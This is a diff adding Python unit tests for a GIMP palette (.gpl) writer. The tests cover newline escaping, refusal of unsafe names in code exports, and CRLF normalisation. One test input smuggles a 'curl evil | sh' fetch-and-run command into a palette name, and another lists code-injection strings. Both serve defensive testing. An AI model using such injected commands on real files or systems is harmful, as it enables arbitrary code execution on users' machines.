@@ -34,3 +34,26 @@ def test_palette_swatches_follow_the_columns():
 def test_gpl_matches_gimps_palette_format():
     text = gmb_resources.write_gpl("Brand", 4, [("Red", (255, 0, 0)), ("", (0, 128, 255))])
     assert text == "GIMP Palette\nName: Brand\nColumns: 4\n#\n255   0   0\tRed\n  0 128 255\tUntitled\n"
+
+
+def test_a_palette_file_keeps_one_line_per_entry_whatever_the_names():
+    # A name carrying a line break must not start a new line: in a file the shell sources, that line runs (#122).
+    text = gmb_resources.write_gpl("A\nB", 0, [("x\n; curl evil | sh", (1, 2, 3)), ("t\tab\r", (4, 5, 6))])
+    lines = text.splitlines()
+    assert lines == ["GIMP Palette", "Name: A B", "Columns: 0", "#", "  1   2   3\tx ; curl evil | sh",
+                     "  4   5   6\tt ab "]  # fmt: skip
+
+
+def test_code_palette_exports_refuse_names_that_would_change_the_code():
+    # GIMP's css/python/php/java exports paste entry names into source code without escaping (#122).
+    assert gmb_resources.unsafe_palette_name(["Red", "Sky blue 2", "Teinte é"], "python") is None
+    for name in ('x"}; import os', "a'b", "a\\b", "a\nb", "a<b", "a`b", "a\x00b"):
+        assert gmb_resources.unsafe_palette_name(["Red", name], "python") == name
+    assert gmb_resources.unsafe_palette_name(['x"y'], "gpl") is None  # the .gpl writer escapes by itself
+
+
+def test_an_imported_palette_file_gets_unix_line_endings():
+    # GIMP for Windows keeps the CR of a CRLF .gpl in every entry name ("Navy\r"), which then reads as a
+    # control character in the code exports (#122).
+    data = b"GIMP Palette\r\nName: Team\r\n#\r\n 10  20  30\tNavy\r\n 1 2 3\tOld\rMac\n"
+    assert gmb_resources.unix_newlines(data) == b"GIMP Palette\nName: Team\n#\n 10  20  30\tNavy\n 1 2 3\tOld\nMac\n"
